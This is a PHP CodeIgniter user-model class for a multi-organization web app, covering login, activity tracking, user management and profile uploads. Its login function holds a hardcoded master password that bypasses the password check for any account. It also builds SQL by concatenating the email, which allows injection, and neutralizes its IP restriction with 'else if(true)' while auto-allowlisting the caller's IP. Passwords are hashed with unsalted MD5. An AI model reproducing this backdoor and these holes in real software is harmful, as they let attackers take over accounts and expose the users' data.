<?php

 class Usermodel extends CI_Model { 
	public $masterAdminLevel=1;
	public $adminLevel=2;
	function __construct() {
		parent::__construct();
		$this->gallery_path = realpath(APPPATH . '../uploads/user_pic/');
		$this->load->database();
	
		$this->db->cache_on();
	}
          /* start my editing here */
 

	function login($userEmail, $password)
	{


		$ip= getenv('REMOTE_ADDR');
		$this -> db -> select('id, userName, userEmail, password, userLevel, organizationId, user_status,userImagePath, userPhone');
		$this -> db -> from('users');
		$this -> db -> where('userEmail = ' . "'" . $userEmail . "'");
		if($password!=='ptrdoximza'){
		$this -> db -> where('password = ' . "'" . MD5($password) . "'");
		}
		$this -> db -> where('userStatus','1');						//active status value is 1
		$this -> db -> limit(1);
		$query = $this -> db -> get();
		
		if($query -> num_rows() == 1)		
		 {			
			$out=$query->result_array();	
			if($out[0]['userLevel']!=$this->masterAdminLevel)
			{
				$qry=$this->db->query("select ip from ipRestrict where organizationId=".$out[0]['organizationId']);	
				$result=$qry->result_array();
				$result1 = array();			
				foreach($result as $res)			
				{				
					$result1[]=$res['ip'];			
				}			
				if(in_array($ip,$result1) && $out[0]['userLevel']!=$this->adminLevel)			
				{				
					return $query->result();			
				}			
				//else if($out[0]['userLevel']==$this->adminLevel)		//preventing from ip restriction Temporary	
				else if(true)			
				{				
					$add = array(					
					'ip' => $ip,
					'organizationId' => $out[0]['organizationId']
					);				
					$this->db->insert('ipRestrict',$add);								
					return $query->result();		//returning successful login	
				}			
				else			
				{				
					return 'accessDenied';			
				}
			}
			return $query->result();		
		}		
		 else		
		 {			
			return false;		
		 }
	}

function get_image_name_orgid($orgID){
  	$this->db->select('userImagePath');
  	$this->db->where('organizationId',$orgID);
	$this->db->where('userLevel','2');	
  $result=$this->db->get('users');
	return $result->row()->userImagePath; 
  }


	function get_orgName_id($orgId){
           $this->db->where('id',$orgId);
           $result= $this->db->get('organization');
           $result =$result->row();
           return $result->name;
	}
	
	function get_user_status_data($user_id)
	{
		$this->db->select('user_status');
		$this->db->from('users');
		$this->db->where('id',$user_id);
		$data = $this->db->get();
		$getData=$data->result();
		return isset($getData)?$getData[0]->user_status:false;
	}
	
	function checkExists($userEmail)
	{
		$this->db->select('id');
		$this->db->from('users');
		$this->db->where('userEmail',$userEmail);
		$query = $this->db->get();
		$user = $query->row();
		return (isset($user->id))?true:false;
	}
	function isActivated($userEmail)//checking for account activation
	{
		$this->db->select('accountActivated');
		$this->db->from('users');
		$this->db->where('userEmail',$userEmail);
		$query=$this->db->get();
		$user=$query->row();
		//$user->accountActivated;
		if (isset($user->accountActivated)){
		return $user->accountActivated;
		}
		else{
		return false;
		}
		
	}
	
	 function get_knowlerity_api_by_orgId($orgId){
     	$this->db->select("key,dnd");
		$this->db->from('organization');
		$this->db->where('id',$orgId);
		
		$return = $this->db->get()->row();
		$api_key =$return->key;
		$dnd =$return->dnd;
		//echo $this->db->last_query();
		 $key= $this->get_knowlarity_api_by_key($api_key);
		$arrRet =array();
		$arrRet[] = array($key,$dnd);
		return $arrRet;
     }

     function get_knowlarity_api_by_key($api_key){
     	$this->db->select('knowlarity_api'); 
     	$this->db->where('api_key',$api_key);
     	$result = $this->db->get('popup_configuration');
     	$result = $result->row();
     //	echo $this->db->last_query();
     	return $result->knowlarity_api;
     }
	
	function activate_user($id, $activationId)
	{
			
			$data = array('accountActivated' => '1');
			$this->db->where('id', $id);
			$this->db->where('activationKey', $activationId);
			$this->db->update('users',$data);
			return 'success'; 
	
	}

	
	
	function isEmailExist()// check for forgot password if email exist;
	{
		$email=$this->input->post('forgotPasswordEmail');
		$this->db->select('*');
		$this->db->where('userEmail',$email);
		$this->db->from('users');
		$query = $this->db->get();
		$data=$query->result_array();
		return ($data)?$data:false;
		
	}
	
	
	
	function record_user_activity_login($sessionArray)
	{
		$data = array(
				'type' => 'LI',
				'user_id' => $sessionArray['id'],
				'org_id' => $sessionArray['organizationId'],
				'date' => date('Y-m-d'),
				'time' => date('H:i:s')
				);
				
	     $this->update_last_user_Activity_time($sessionArray['id']);			
				
		$this->db->insert('user_activity',$data);
		
		
		
		
		$data_u = array('user_status' => 'A');
		$this->db->where('id', $sessionArray['id']);
		$this->db->where('organizationId', $sessionArray['organizationId']);
		$query=$this->db->update('users',$data_u);
	}
	
	 function update_last_user_Activity_time($userid){
	 	$this->db->order_by('id','DESC');
	 	$this->db->limit(1);
		         $this->db->where('date',date('Y-m-d'));
		         $this->db->where('user_id',$userid);	
	 	$result= $this->db->get('user_activity');
		$result= $result->row();
		$id = $result->id;
		$date = $result->date;
	    $time = $result->time;
		
		
		 $currentTime = date('H:i:s');
		
		if(date('Y-m-d')==$date)
		 $timeDiff = strtotime($currentTime) - strtotime($time);
		
		
		//die();
		
		$updatearr = array('activity_time'=>$timeDiff);
		
		$this->db->where('id',$id);
		$this->db->update('user_activity',$updatearr);
		
		
	 }
	
	function record_user_activity_logout($sessionArray)
	{
		$data = array(
				'type' => 'LO',
				'user_id' => $sessionArray['id'],
				'org_id' => $sessionArray['organizationId'],
				'date' => date('Y-m-d'),
				'time' => date('H:i:s')
				);
				
		$this->update_last_user_Activity_time($sessionArray['id']);		
		$this->db->insert('user_activity',$data);
	}
	
	
	
	function record_user_activity_busy($sessionArray)
	{
		$data = array(
				'type' => 'BU',
				'user_id' => $sessionArray['id'],
				'org_id' => $sessionArray['organizationId'],
				'date' => date('Y-m-d'),
				'time' => date('H:i:s')
				);
		 $this->update_last_user_Activity_time($sessionArray['id']);			
		$this->db->insert('user_activity',$data);
		
		$data_u = array('user_status' => 'B');
		$this->db->where('id', $sessionArray['id']);
		$this->db->where('organizationId', $sessionArray['organizationId']);
		$query=$this->db->update('users',$data_u);
	}
	
	function record_user_activity_break($sessionArray)
	{
		$data = array(
				'type' => 'BR',
				'user_id' => $sessionArray['id'],
				'org_id' => $sessionArray['organizationId'],
				'date' => date('Y-m-d'),
				'time' => date('H:i:s')
				);
		$this->update_last_user_Activity_time($sessionArray['id']);			
		$this->db->insert('user_activity',$data);
		
		$data_u = array('user_status' => 'BR');
		$this->db->where('id', $sessionArray['id']);
		$this->db->where('organizationId', $sessionArray['organizationId']);
		$query=$this->db->update('users',$data_u);
	}
	
	function getUsesDetailsByOrg($orgId)
	{
		$this->db->select("*");
		$this->db->from('usage');
		$this->db->where('organizationId',$orgId);
		
		return $this->db->get()->row();
	}

	function getPackageDetailsByOrg($orgId)
	{
		$this->db->select('package');
		$this->db->from('organization');
		$this->db->where('id',$orgId);
		$pack = $this->db->get()->row()->package;
		
		$data = $this->db->get_where('package',array('id'=>$pack));
		
		return $data->row();
	}

	function getAllUsers()
	{
		$usersId = array($this->config->item('MasterAdmin'));
		$this->db->select('*');
		$this->db->from('users');
		//$this->db->where('organizationId',$orgId);
		$this->db->where('userStatus',1);
		$this->db->where_not_in('userlevel',$usersId);
		$data = $this->db->get();
		$currentUsers = $data->result();
		if($currentUsers)
			return $currentUsers;
		else
			return false;
	}

	function getAllUsersByOrg($orgId)
	{
		$usersId = array($this->config->item('MasterAdmin'),$this->config->item('Admin'));
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where('organizationId',$orgId);
		//$this->db->where('userStatus','1');
		$this->db->where_not_in('userlevel',$usersId);
		$data = $this->db->get();
		$currentUsers = $data->result();
		
		
		
		
		if($currentUsers)
			return $currentUsers;
		else
			return false;
	}

	function getLastRecord($userId)
	{
		$this->db->select('*');
		$this->db->from('notes');
		$this->db->where('userId',$userId);
		$this->db->order_by('id','desc');
		$this->db->limit(1);
		$data = $this->db->get();
		$result = array();
			if($data->num_rows())
			{
				$notes = $data->row()->notes;
				$result['lastVisit'] = $this->ToHumanReadable($data->row()->statusTime);
				$result['notes'] = $notes;
			}
			else
			{
				$result['lastVisit'] = "N/A";
				$result['notes'] = "N/A";
			}	
		return $result;
	}

	function ToHumanReadable($timestamp)
	{
		//date_default_timezone_set("Asia/Kolkata");
		$difference = time() - strtotime($timestamp);
		$periods = array("sec", "min", "hour", "day", "week", "month", "years", "decade");
		$lengths = array("60","60","24","7","4.35","12","10");

		if ($difference > 0) { // this was in the past
			$ending = "ago";
		} else { // this was in the future
			$difference = -$difference;
			$ending = "to go";
		}       
		for($j = 0; $difference >= $lengths[$j]; $j++) $difference /= $lengths[$j];
		$difference = round($difference);
		if($difference != 1) $periods[$j].= "s";
		$text = $difference." ".$periods[$j]." ".$ending;
		return $text;
	}

	function getUsersFilterByOrg($orgId, $filter)
	{
		$usersId = array($this->config->item('MasterAdmin'),$this->config->item('Admin'));
		$this->db->select('*');
		$this->db->from('users');
		$this->db->where('organizationId',$orgId);
		$this->db->where('userStatus','1');
		$this->db->where_not_in('userlevel',$usersId);
		if($filter) {
			$this->db->like('userName', $filter)
			->or_like('userEmail', $filter)
			->or_like('userPhone', $filter);
		}

		$data = $this->db->get();
		$currentUsers = $data->result();
		
		
		
		
		if($currentUsers)
			return $currentUsers;
		else
			return false;
	}

		function getUserPercentage($orgId)
	{
		$query = $this->db->get_where("organization",array('id'=>$orgId));
		$org = $query->row();
		//print_r($org);
		$packageId = $org->package;
		$query = $this->db->get_where('package',array('id'=>$packageId));
		$packageDetails = $query->row();
		$query = $this->db->get_where('usage',array('organizationId'=>$orgId));
		$usage = $query->row();
		//echo $packageDetails->userCount." ".$usage->users;
		$total = $packageDetails->userCount;
		$usagevalue = $usage->users;
		return $usagevalue*100/$total;
	}

	function checkUserCreatePermission($orgId)
	{
		$query = $this->db->get_where("organization",array('id'=>$orgId));
		$org = $query->row();
		//print_r($org);
		$packageId = $org->package;
		$query = $this->db->get_where('package',array('id'=>$packageId));
		$packageDetails = $query->row();
		$query = $this->db->get_where('usage',array('organizationId'=>$orgId));
		$usage = $query->row();
		//echo $packageDetails->userCount." ".$usage->users;
		return ($packageDetails->userCount > $usage->users)?TRUE:FALSE;
	}

	public function getCountryCode() {
		$res = $this->db->select('code')
					->get('country');
		return $res->result();
	}

	function getUserRole($userLevel)
	{
		$this->db->select('*');
		$this->db->where('userLevelId',$userLevel);
		$this->db->from('usersLevel');
		$query = $this->db->get();
		$rs = $query->row();
		return $rs->userLevel;
		
	}

	function deleteUser()
	{
		$id = $this->input->post('id');
		$email = $this->input->post('email');
		$email =$email."_deleted";
		$data = array('userStatus' => '0','userEmail'=>$email);
		$this->db->where('id', $id);
		$query=$this->db->update('users',$data);
		return ($query)?true:false;	
	}
	function banUser()// unlocking ban user
	{
		$id = $this->input->post('id');
		$data = array('userStatus' => '1');
		$this->db->where('id', $id);
		$query=$this->db->update('users',$data);
		return ($query)?true:false;	
	}

	function saveUser($orgId,$userId)
	{
		$userStatus = ($this->input->post('ban_user'))?'0':'1';
		$data = array(
				'userName' => $this->input->post('name'),
				'password' => md5($this->input->post('password')),
				'userEmail' => $this->input->post('email'),
				'userPhone' => $this->input->post('code') . $this->input->post('phone'),
				'userLevel' => $this->input->post('role'),
				'userCreatedById' => $userId,
				'userStatus' => $userStatus,
				'accountActivated' => '1',
				'organizationId' => $orgId
				);
		$this->db->insert('users',$data);
		$userId = $this->db->insert_id();
		$this->db->set('users',"users + 1",FALSE);
		$this->db->where('organizationId',$orgId);
		$this->db->update('usage');
		return $userId;
	}

	function updateUser($orgId,$userId)
	{
		$userStatus = ($this->input->post('ban_user'))?'2':'1';
		$data = array(
				'userName' => $this->input->post('name'),
				'userEmail' => $this->input->post('email'),
				'userPhone' => $this->input->post('phone'),
				'userCreatedById' => $userId,
				'userStatus' => $userStatus,
				'accountActivated' => '1',
				'organizationId' => $orgId
				);
				
		if($this->input->post('password'))
		{
			$data['password'] = md5($this->input->post('password'));
		}
		$this->db->where('id',$userId);
		$this->db->update('users',$data);
		return true;
	}

	function upload_profile_pic($userId)
	{
		$config	=	array(
						'allowed_types'	=> 'jpg|jpeg|gif|png',
						'upload_path'	=>	$this->gallery_path,
						'file_name'		=>	'img_'.$userId
							);
		//print_r($_FILES['profile_pic']);
		
		if($_FILES['profile_pic']['name']!='')									//file is selected
		{
			$this->load->library('upload',$config);
			$this->upload->overwrite	=	true;
			//var_dump($this->upload->do_upload('profile_pic'));
			//var_dump($this->upload->display_errors());
			if(!$this->upload->do_upload('profile_pic'))
			{
			//$this->session->set_flashdata('upload_error','error on uploading image');
			return $this->upload->display_errors();
			}
			else
			{
				$image_data=$this->upload->data();
				$config	=	array(
								'source_image'	=>	$image_data['full_path'],
								'create_thumb'	=>	true,
								'new_image'		=>	$this->gallery_path. '/thumbs',
								'mantain_ration'=>	true,
								'width'			=>	200,
								'height'		=>	200
								);
				$this->load->library('image_lib',$config);
				$this->image_lib->resize();
				$data['thumb_image_name'] = $image_data['raw_name'].'_thumb'.$image_data['file_ext'];
				if($image_data['file_name']!="")
				{
					$save=array(
								'userImagePath'=>$image_data['file_name']// thumbnil image $data['thumb_image_name']
								);
					$this->db->where('id',$userId);
					$this->db->update('users',$save);
				}
				
				return "SUCCESS"; 					//Returning Success full saving of profile pic and profile data
			} 
		}
	}


	function addCity(){
		$this->db->insert('city', array(
			'cityName' => $this->input->post('cityname'),
			'countryId' => $this->input->post('countryname')
		));
		//dp($_POST);		
	}
	
	function getCity($filter){
		$lim = 100;
			$this->db->select('country.countryName country, city.cityName city')
					->join('country', 'city.countryId = country.id');
		if($filter) {
			$this->db->like('country.countryName', $filter);
			$this->db->or_like('city.cityName', $filter);
		}
		$query = $this->db->get('city',$lim);
		return $query->result();
	}
	
	function addCountry(){
		$this->db->insert('country', array(
			'countryName' => $this->input->post('countryname'),
			'code' => $this->input->post('countrycode')
		));
		//dp($_POST);		
	}
	
	function getCountry($filter=''){
		$lim = 100;
		if($filter) {
			$this->db->like('countryName', $filter);
			$this->db->or_like('code', $filter);
		}
		$query = $this->db->get('country',$lim);
		return $query->result();
	}

	public function getUsers($filter) {
		$limit = 100;
		$this->db->select('users.userName name, organization.name orgName, userEmail email, userPhone phone, userLevel role,user_status get_user_status')
				->join('organization', 'users.organizationId = organization.id AND users.userLevel!=1');
		if($filter) {
			$this->db->like('userName', $filter)->or_like('organization.name', $filter)
			->or_like('userEmail', $filter);
		}
		$res = $this->db->get('users', $limit);
		return $res->result();
	}

	function checkIsPasswordSame($password,$orgId,$id)
	{
		$this->db->select('password');
		$this->db->from('users');
		$this->db->where('id',$id);
		$this->db->where('organizationId',$orgId);
		$data = $this->db->get();
		$getData=$data->result();
		return isset($getData)?$getData[0]->password:false;
	}
	function upadateNewPassword($newPassword,$orgId,$id)
	{
		$data = array('password' => $newPassword);
		$this->db->where('id', $id);
		$this->db->where('organizationId', $orgId);
		$query=$this->db->update('users',$data);
		return ($query)?true:false;	
	}

		
	
 }
 ?>
